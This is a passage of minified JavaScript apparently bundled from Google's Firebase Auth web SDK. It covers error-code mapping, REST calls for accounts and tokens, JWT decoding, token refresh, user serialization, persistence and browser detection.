 */class gv{static initialize(e,n,r){this.fetchImpl=e,n&&(this.headersImpl=n),r&&(this.responseImpl=r)}static fetch(){if(this.fetchImpl)return this.fetchImpl;if(typeof self<"u"&&"fetch"in self)return self.fetch;Dt("Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static headers(){if(this.headersImpl)return this.headersImpl;if(typeof self<"u"&&"Headers"in self)return self.Headers;Dt("Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static response(){if(this.responseImpl)return this.responseImpl;if(typeof self<"u"&&"Response"in self)return self.Response;Dt("Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const HT={CREDENTIAL_MISMATCH:"custom-token-mismatch",MISSING_CUSTOM_TOKEN:"internal-error",INVALID_IDENTIFIER:"invalid-email",MISSING_CONTINUE_URI:"internal-error",INVALID_PASSWORD:"wrong-password",MISSING_PASSWORD:"missing-password",EMAIL_EXISTS:"email-already-in-use",PASSWORD_LOGIN_DISABLED:"operation-not-allowed",INVALID_IDP_RESPONSE:"invalid-credential",INVALID_PENDING_TOKEN:"invalid-credential",FEDERATED_USER_ID_ALREADY_LINKED:"credential-already-in-use",MISSING_REQ_TYPE:"internal-error",EMAIL_NOT_FOUND:"user-not-found",RESET_PASSWORD_EXCEED_LIMIT:"too-many-requests",EXPIRED_OOB_CODE:"expired-action-code",INVALID_OOB_CODE:"invalid-action-code",MISSING_OOB_CODE:"internal-error",CREDENTIAL_TOO_OLD_LOGIN_AGAIN:"requires-recent-login",INVALID_ID_TOKEN:"invalid-user-token",TOKEN_EXPIRED:"user-token-expired",USER_NOT_FOUND:"user-token-expired",TOO_MANY_ATTEMPTS_TRY_LATER:"too-many-requests",PASSWORD_DOES_NOT_MEET_REQUIREMENTS:"password-does-not-meet-requirements",INVALID_CODE:"invalid-verification-code",INVALID_SESSION_INFO:"invalid-verification-id",INVALID_TEMPORARY_PROOF:"invalid-credential",MISSING_SESSION_INFO:"missing-verification-id",SESSION_EXPIRED:"code-expired",MISSING_ANDROID_PACKAGE_NAME:"missing-android-pkg-name",UNAUTHORIZED_DOMAIN:"unauthorized-continue-uri",INVALID_OAUTH_CLIENT_ID:"invalid-oauth-client-id",ADMIN_ONLY_OPERATION:"admin-restricted-operation",INVALID_MFA_PENDING_CREDENTIAL:"invalid-multi-factor-session",MFA_ENROLLMENT_NOT_FOUND:"multi-factor-info-not-found",MISSING_MFA_ENROLLMENT_ID:"missing-multi-factor-info",MISSING_MFA_PENDING_CREDENTIAL:"missing-multi-factor-session",SECOND_FACTOR_EXISTS:"second-factor-already-in-use",SECOND_FACTOR_LIMIT_EXCEEDED:"maximum-second-factor-count-exceeded",BLOCKING_FUNCTION_ERROR_RESPONSE:"internal-error",RECAPTCHA_NOT_ENABLED:"recaptcha-not-enabled",MISSING_RECAPTCHA_TOKEN:"missing-recaptcha-token",INVALID_RECAPTCHA_TOKEN:"invalid-recaptcha-token",INVALID_RECAPTCHA_ACTION:"invalid-recaptcha-action",MISSING_CLIENT_TYPE:"missing-client-type",MISSING_RECAPTCHA_VERSION:"missing-recaptcha-version",INVALID_RECAPTCHA_VERSION:"invalid-recaptcha-version",INVALID_REQ_TYPE:"invalid-req-type"};/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const WT=new Gs(3e4,6e4);function _r(t,e){return t.tenantId&&!e.tenantId?Object.assign(Object.assign({},e),{tenantId:t.tenantId}):e}async function vr(t,e,n,r,i={}){return _v(t,i,async()=>{let s={},o={};r&&(e==="GET"?o=r:s={body:JSON.stringify(r)});const l=_i(Object.assign({key:t.config.apiKey},o)).slice(1),a=await t._getAdditionalHeaders();return a["Content-Type"]="application/json",t.languageCode&&(a["X-Firebase-Locale"]=t.languageCode),gv.fetch()(vv(t,t.config.apiHost,n,l),Object.assign({method:e,headers:a,referrerPolicy:"no-referrer"},s))})}async function _v(t,e,n){t._canInitEmulator=!1;const r=Object.assign(Object.assign({},HT),e);try{const i=new $T(t),s=await Promise.race([n(),i.promise]);i.clearNetworkTimeout();const o=await s.json();if("needConfirmation"in o)throw To(t,"account-exists-with-different-credential",o);if(s.ok&&!("errorMessage"in o))return o;{const l=s.ok?o.errorMessage:o.error.message,[a,u]=l.split(" : ");if(a==="FEDERATED_USER_ID_ALREADY_LINKED")throw To(t,"credential-already-in-use",o);if(a==="EMAIL_EXISTS")throw To(t,"email-already-in-use",o);if(a==="USER_DISABLED")throw To(t,"user-disabled",o);const c=r[a]||a.toLowerCase().replace(/[_\s]+/g,"-");if(u)throw FT(t,c,u);wt(t,c)}}catch(i){if(i instanceof Yt)throw i;wt(t,"network-request-failed",{message:String(i)})}}async function Ks(t,e,n,r,i={}){const s=await vr(t,e,n,r,i);return"mfaPendingCredential"in s&&wt(t,"multi-factor-auth-required",{_serverResponse:s}),s}function vv(t,e,n,r){const i=`${e}${n}?${r}`;return t.config.emulator?Yd(t.config,i):`${t.config.apiScheme}://${i}`}class $T{constructor(e){this.auth=e,this.timer=null,this.promise=new Promise((n,r)=>{this.timer=setTimeout(()=>r(Nt(this.auth,"network-request-failed")),WT.get())})}clearNetworkTimeout(){clearTimeout(this.timer)}}function To(t,e,n){const r={appName:t.name};n.email&&(r.email=n.email),n.phoneNumber&&(r.phoneNumber=n.phoneNumber);const i=Nt(t,e,r);return i.customData._tokenResponse=n,i}async function VT(t,e){return vr(t,"GET","/v2/recaptchaConfig",_r(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function qT(t,e){return vr(t,"POST","/v1/accounts:delete",e)}async function GT(t,e){return vr(t,"POST","/v1/accounts:lookup",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ts(t){if(t)try{const e=new Date(Number(t));if(!isNaN(e.getTime()))return e.toUTCString()}catch{}}async function KT(t,e=!1){const n=Ie(t),r=await n.getIdToken(e),i=Qd(r);O(i&&i.exp&&i.auth_time&&i.iat,n.auth,"internal-error");const s=typeof i.firebase=="object"?i.firebase:void 0,o=s==null?void 0:s.sign_in_provider;return{claims:i,token:r,authTime:ts(ou(i.auth_time)),issuedAtTime:ts(ou(i.iat)),expirationTime:ts(ou(i.exp)),signInProvider:o||null,signInSecondFactor:(s==null?void 0:s.sign_in_second_factor)||null}}function ou(t){return Number(t)*1e3}function Qd(t){const[e,n,r]=t.split(".");if(e===void 0||n===void 0||r===void 0)return Bo("JWT malformed, contained fewer than 3 sections"),null;try{const i=El(n);return i?JSON.parse(i):(Bo("Failed to decode base64 JWT payload"),null)}catch(i){return Bo("Caught error parsing JWT payload as JSON",i==null?void 0:i.toString()),null}}function YT(t){const e=Qd(t);return O(e,"internal-error"),O(typeof e.exp<"u","internal-error"),O(typeof e.iat<"u","internal-error"),Number(e.exp)-Number(e.iat)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Rs(t,e,n=!1){if(n)return e;try{return await e}catch(r){throw r instanceof Yt&&QT(r)&&t.auth.currentUser===t&&await t.auth.signOut(),r}}function QT({code:t}){return t==="auth/user-disabled"||t==="auth/user-token-expired"}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class XT{constructor(e){this.user=e,this.isRunning=!1,this.timerId=null,this.errorBackoff=3e4}_start(){this.isRunning||(this.isRunning=!0,this.schedule())}_stop(){this.isRunning&&(this.isRunning=!1,this.timerId!==null&&clearTimeout(this.timerId))}getInterval(e){var n;if(e){const r=this.errorBackoff;return this.errorBackoff=Math.min(this.errorBackoff*2,96e4),r}else{this.errorBackoff=3e4;const i=((n=this.user.stsTokenManager.expirationTime)!==null&&n!==void 0?n:0)-Date.now()-3e5;return Math.max(0,i)}}schedule(e=!1){if(!this.isRunning)return;const n=this.getInterval(e);this.timerId=setTimeout(async()=>{await this.iteration()},n)}async iteration(){try{await this.user.getIdToken(!0)}catch(e){(e==null?void 0:e.code)==="auth/network-request-failed"&&this.schedule(!0);return}this.schedule()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yv{constructor(e,n){this.createdAt=e,this.lastLoginAt=n,this._initializeTime()}_initializeTime(){this.lastSignInTime=ts(this.lastLoginAt),this.creationTime=ts(this.createdAt)}_copy(e){this.createdAt=e.createdAt,this.lastLoginAt=e.lastLoginAt,this._initializeTime()}toJSON(){return{createdAt:this.createdAt,lastLoginAt:this.lastLoginAt}}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function kl(t){var e;const n=t.auth,r=await t.getIdToken(),i=await Rs(t,GT(n,{idToken:r}));O(i==null?void 0:i.users.length,n,"internal-error");const s=i.users[0];t._notifyReloadListener(s);const o=!((e=s.providerUserInfo)===null||e===void 0)&&e.length?eI(s.providerUserInfo):[],l=ZT(t.providerData,o),a=t.isAnonymous,u=!(t.email&&s.passwordHash)&&!(l!=null&&l.length),c=a?u:!1,d={uid:s.localId,displayName:s.displayName||null,photoURL:s.photoUrl||null,email:s.email||null,emailVerified:s.emailVerified||!1,phoneNumber:s.phoneNumber||null,tenantId:s.tenantId||null,providerData:l,metadata:new yv(s.createdAt,s.lastLoginAt),isAnonymous:c};Object.assign(t,d)}async function JT(t){const e=Ie(t);await kl(e),await e.auth._persistUserIfCurrent(e),e.auth._notifyListenersIfCurrent(e)}function ZT(t,e){return[...t.filter(r=>!e.some(i=>i.providerId===r.providerId)),...e]}function eI(t){return t.map(e=>{var{providerId:n}=e,r=Gd(e,["providerId"]);return{providerId:n,uid:r.rawId||"",displayName:r.displayName||null,email:r.email||null,phoneNumber:r.phoneNumber||null,photoURL:r.photoUrl||null}})}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function tI(t,e){const n=await _v(t,{},async()=>{const r=_i({grant_type:"refresh_token",refresh_token:e}).slice(1),{tokenApiHost:i,apiKey:s}=t.config,o=vv(t,i,"/v1/token",`key=${s}`),l=await t._getAdditionalHeaders();return l["Content-Type"]="application/x-www-form-urlencoded",gv.fetch()(o,{method:"POST",headers:l,body:r})});return{accessToken:n.access_token,expiresIn:n.expires_in,refreshToken:n.refresh_token}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ns{constructor(){this.refreshToken=null,this.accessToken=null,this.expirationTime=null}get isExpired(){return!this.expirationTime||Date.now()>this.expirationTime-3e4}updateFromServerResponse(e){O(e.idToken,"internal-error"),O(typeof e.idToken<"u","internal-error"),O(typeof e.refreshToken<"u","internal-error");const n="expiresIn"in e&&typeof e.expiresIn<"u"?Number(e.expiresIn):YT(e.idToken);this.updateTokensAndExpiration(e.idToken,e.refreshToken,n)}async getToken(e,n=!1){return O(!this.accessToken||this.refreshToken,e,"user-token-expired"),!n&&this.accessToken&&!this.isExpired?this.accessToken:this.refreshToken?(await this.refresh(e,this.refreshToken),this.accessToken):null}clearRefreshToken(){this.refreshToken=null}async refresh(e,n){const{accessToken:r,refreshToken:i,expiresIn:s}=await tI(e,n);this.updateTokensAndExpiration(r,i,Number(s))}updateTokensAndExpiration(e,n,r){this.refreshToken=n||null,this.accessToken=e||null,this.expirationTime=Date.now()+r*1e3}static fromJSON(e,n){const{refreshToken:r,accessToken:i,expirationTime:s}=n,o=new Ns;return r&&(O(typeof r=="string","internal-error",{appName:e}),o.refreshToken=r),i&&(O(typeof i=="string","internal-error",{appName:e}),o.accessToken=i),s&&(O(typeof s=="number","internal-error",{appName:e}),o.expirationTime=s),o}toJSON(){return{refreshToken:this.refreshToken,accessToken:this.accessToken,expirationTime:this.expirationTime}}_assign(e){this.accessToken=e.accessToken,this.refreshToken=e.refreshToken,this.expirationTime=e.expirationTime}_clone(){return Object.assign(new Ns,this.toJSON())}_performRefresh(){return Dt("not implemented")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Zt(t,e){O(typeof t=="string"||typeof t>"u","internal-error",{appName:e})}class Yn{constructor(e){var{uid:n,auth:r,stsTokenManager:i}=e,s=Gd(e,["uid","auth","stsTokenManager"]);this.providerId="firebase",this.proactiveRefresh=new XT(this),this.reloadUserInfo=null,this.reloadListener=null,this.uid=n,this.auth=r,this.stsTokenManager=i,this.accessToken=i.accessToken,this.displayName=s.displayName||null,this.email=s.email||null,this.emailVerified=s.emailVerified||!1,this.phoneNumber=s.phoneNumber||null,this.photoURL=s.photoURL||null,this.isAnonymous=s.isAnonymous||!1,this.tenantId=s.tenantId||null,this.providerData=s.providerData?[...s.providerData]:[],this.metadata=new yv(s.createdAt||void 0,s.lastLoginAt||void 0)}async getIdToken(e){const n=await Rs(this,this.stsTokenManager.getToken(this.auth,e));return O(n,this.auth,"internal-error"),this.accessToken!==n&&(this.accessToken=n,await this.auth._persistUserIfCurrent(this),this.auth._notifyListenersIfCurrent(this)),n}getIdTokenResult(e){return KT(this,e)}reload(){return JT(this)}_assign(e){this!==e&&(O(this.uid===e.uid,this.auth,"internal-error"),this.displayName=e.displayName,this.photoURL=e.photoURL,this.email=e.email,this.emailVerified=e.emailVerified,this.phoneNumber=e.phoneNumber,this.isAnonymous=e.isAnonymous,this.tenantId=e.tenantId,this.providerData=e.providerData.map(n=>Object.assign({},n)),this.metadata._copy(e.metadata),this.stsTokenManager._assign(e.stsTokenManager))}_clone(e){const n=new Yn(Object.assign(Object.assign({},this),{auth:e,stsTokenManager:this.stsTokenManager._clone()}));return n.metadata._copy(this.metadata),n}_onReload(e){O(!this.reloadListener,this.auth,"internal-error"),this.reloadListener=e,this.reloadUserInfo&&(this._notifyReloadListener(this.reloadUserInfo),this.reloadUserInfo=null)}_notifyReloadListener(e){this.reloadListener?this.reloadListener(e):this.reloadUserInfo=e}_startProactiveRefresh(){this.proactiveRefresh._start()}_stopProactiveRefresh(){this.proactiveRefresh._stop()}async _updateTokensIfNecessary(e,n=!1){let r=!1;e.idToken&&e.idToken!==this.stsTokenManager.accessToken&&(this.stsTokenManager.updateFromServerResponse(e),r=!0),n&&await kl(this),await this.auth._persistUserIfCurrent(this),r&&this.auth._notifyListenersIfCurrent(this)}async delete(){const e=await this.getIdToken();return await Rs(this,qT(this.auth,{idToken:e})),this.stsTokenManager.clearRefreshToken(),this.auth.signOut()}toJSON(){return Object.assign(Object.assign({uid:this.uid,email:this.email||void 0,emailVerified:this.emailVerified,displayName:this.displayName||void 0,isAnonymous:this.isAnonymous,photoURL:this.photoURL||void 0,phoneNumber:this.phoneNumber||void 0,tenantId:this.tenantId||void 0,providerData:this.providerData.map(e=>Object.assign({},e)),stsTokenManager:this.stsTokenManager.toJSON(),_redirectEventId:this._redirectEventId},this.metadata.toJSON()),{apiKey:this.auth.config.apiKey,appName:this.auth.name})}get refreshToken(){return this.stsTokenManager.refreshToken||""}static _fromJSON(e,n){var r,i,s,o,l,a,u,c;const d=(r=n.displayName)!==null&&r!==void 0?r:void 0,h=(i=n.email)!==null&&i!==void 0?i:void 0,m=(s=n.phoneNumber)!==null&&s!==void 0?s:void 0,_=(o=n.photoURL)!==null&&o!==void 0?o:void 0,v=(l=n.tenantId)!==null&&l!==void 0?l:void 0,w=(a=n._redirectEventId)!==null&&a!==void 0?a:void 0,p=(u=n.createdAt)!==null&&u!==void 0?u:void 0,f=(c=n.lastLoginAt)!==null&&c!==void 0?c:void 0,{uid:g,emailVerified:y,isAnonymous:T,providerData:k,stsTokenManager:N}=n;O(g&&N,e,"internal-error");const x=Ns.fromJSON(this.name,N);O(typeof g=="string",e,"internal-error"),Zt(d,e.name),Zt(h,e.name),O(typeof y=="boolean",e,"internal-error"),O(typeof T=="boolean",e,"internal-error"),Zt(m,e.name),Zt(_,e.name),Zt(v,e.name),Zt(w,e.name),Zt(p,e.name),Zt(f,e.name);const W=new Yn({uid:g,auth:e,email:h,emailVerified:y,displayName:d,isAnonymous:T,photoURL:_,phoneNumber:m,tenantId:v,stsTokenManager:x,createdAt:p,lastLoginAt:f});return k&&Array.isArray(k)&&(W.providerData=k.map(F=>Object.assign({},F))),w&&(W._redirectEventId=w),W}static async _fromIdTokenResponse(e,n,r=!1){const i=new Ns;i.updateFromServerResponse(n);const s=new Yn({uid:n.localId,auth:e,stsTokenManager:i,isAnonymous:r});return await kl(s),s}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const yp=new Map;function Mt(t){Vt(t instanceof Function,"Expected a class definition");let e=yp.get(t);return e?(Vt(e instanceof t,"Instance stored in cache mismatched with class"),e):(e=new t,yp.set(t,e),e)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wv{constructor(){this.type="NONE",this.storage={}}async _isAvailable(){return!0}async _set(e,n){this.storage[e]=n}async _get(e){const n=this.storage[e];return n===void 0?null:n}async _remove(e){delete this.storage[e]}_addListener(e,n){}_removeListener(e,n){}}wv.type="NONE";const wp=wv;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ho(t,e,n){return`firebase:${t}:${e}:${n}`}class qr{constructor(e,n,r){this.persistence=e,this.auth=n,this.userKey=r;const{config:i,name:s}=this.auth;this.fullUserKey=Ho(this.userKey,i.apiKey,s),this.fullPersistenceKey=Ho("persistence",i.apiKey,s),this.boundEventHandler=n._onStorageEvent.bind(n),this.persistence._addListener(this.fullUserKey,this.boundEventHandler)}setCurrentUser(e){return this.persistence._set(this.fullUserKey,e.toJSON())}async getCurrentUser(){const e=await this.persistence._get(this.fullUserKey);return e?Yn._fromJSON(this.auth,e):null}removeCurrentUser(){return this.persistence._remove(this.fullUserKey)}savePersistenceForRedirect(){return this.persistence._set(this.fullPersistenceKey,this.persistence.type)}async setPersistence(e){if(this.persistence===e)return;const n=await this.getCurrentUser();if(await this.removeCurrentUser(),this.persistence=e,n)return this.setCurrentUser(n)}delete(){this.persistence._removeListener(this.fullUserKey,this.boundEventHandler)}static async create(e,n,r="authUser"){if(!n.length)return new qr(Mt(wp),e,r);const i=(await Promise.all(n.map(async u=>{if(await u._isAvailable())return u}))).filter(u=>u);let s=i[0]||Mt(wp);const o=Ho(r,e.config.apiKey,e.name);let l=null;for(const u of n)try{const c=await u._get(o);if(c){const d=Yn._fromJSON(e,c);u!==s&&(l=d),s=u;break}}catch{}const a=i.filter(u=>u._shouldAllowMigration);return!s._shouldAllowMigration||!a.length?new qr(s,e,r):(s=a[0],l&&await s._set(o,l.toJSON()),await Promise.all(n.map(async u=>{if(u!==s)try{await u._remove(o)}catch{}})),new qr(s,e,r))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ep(t){const e=t.toLowerCase();if(e.includes("opera/")||e.includes("opr/")||e.includes("opios/"))return"Opera";if(Sv(e))return"IEMobile";if(e.includes("msie")||e.includes("trident/"))return"IE";if(e.includes("edge/"))return"Edge";if(Ev(e))return"Firefox";if(e.includes("silk/"))return"Silk";if(Iv(e))return"Blackberry";if(kv(e))return"Webos";if(Xd(e))return"Safari";if((e.includes("chrome/")||Cv(e))&&!e.includes("edge/"))return"Chrome";if(Tv(e))return"Android";{const n=/([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/,r=t.match(n);if((r==null?void 0:r.length)===2)return r[1]}return"Other"}function Ev(t=Ae()){return/firefox\//i.test(t)}function Xd(t=Ae()){const e=t.toLowerCase();return e.includes("safari/")&&!e.includes("chrome/")&&!e.includes("crios/")&&!e.includes("android")}function Cv(t=Ae()){return/crios\//i.test(t)}function Sv(t=Ae()){return/iemobile/i.test(t)}function Tv(t=Ae()){return/android/i.test(t)}function Iv(t=Ae()){return/blackberry/i.test(t)}function kv(t=Ae()){return/webos/i.test(t)}function fa(t=Ae()){return/iphone|ipad|ipod/i.test(t)||/macintosh/i.test(t)&&/mobile/i.test(t)}function nI(t=Ae()){var e;return fa(t)&&!!(!((e=window.navigator)===null||e===void 0)&&e.standalone)}function rI(){return _S()&&document.documentMode===10}function Rv(t=Ae()){return fa(t)||Tv(t)||kv(t)||Iv(t)||/windows phone/i.test(t)||Sv(t)}function iI(){try{return!!(window&&window!==window.top)}catch{return!1}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Nv(t,e=[]){let n;switch(t){case"Browser":n=Ep(Ae());break;case"Worker":n=`${Ep(Ae())}-${t}`;break;default:n=t}const r=e.length?e.join(","):"FirebaseCore-web";return`${n}/JsCore/${gr}/${r}`}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sI{constructor(e){this.auth=e,this.queue=[]}pushCallback(e,n){const r=s=>new Promise((o,l)=>{try{const a=e(s);o(a)}catch(a){l(a)}});r.onAbort=n,this.queue.push(r);const i=this.queue.length-1;return()=>{this.queue[i]=()=>Promise.resolve()}}async runMiddleware(e){if(this.auth.currentUser===e)return;const n=[];try{for(const r of this.queue)await r(e),r.onAbort&&n.push(r.onAbort)}catch(r){n.reverse();for(const i of n)try{i()}catch{}throw this.auth._errorFactory.create("login-blocked",{originalMessage:r==null?void 0:r.message})}}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function oI(t,e={}){return vr(t,"GET","/v2/passwordPolicy",_r(t,e))}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const lI=6;class aI{constructor(e){var n,r,i,s;const o=e.customStrengthOptions;this.customStrengthOptions={},this.customStrengthOptions.minPasswordLength=(n=o.minPasswordLength)!==null&&n!==void 0?n:lI,o.maxPasswordLength&&(this.customStrengthOptions.maxPasswordLength=o.maxPasswordLength),o.containsLowercaseCharacter!==void 0&&(this.customStrengthOptions.containsLowercaseLetter=o.containsLowercaseCharacter),o.containsUppercaseCharacter!==void 0&&(this.customStrengthOptions.containsUppercaseLetter=o.containsUppercaseCharacter),o.containsNumericCharacter!==void 0&&(this.customStrengthOptions.containsNumericCharacter=o.containsNumericCharacter),o.containsNonAlphanumericCharacter!==void 0&&(this.customStrengthOptions.containsNonAlphanumericCharacter=o.containsNonAlphanumericCharacter),this.enforcementState=e.enforcementState,this.enforcementState==="ENFORCEMENT_STATE_UNSPECIFIED"&&(this.enforcementState="OFF"),this.allowedNonAlphanumericCharacters=(i=(r=e.allowedNonAlphanumericCharacters)===null||r===void 0?void 0:r.join(""))!==null&&i!==void 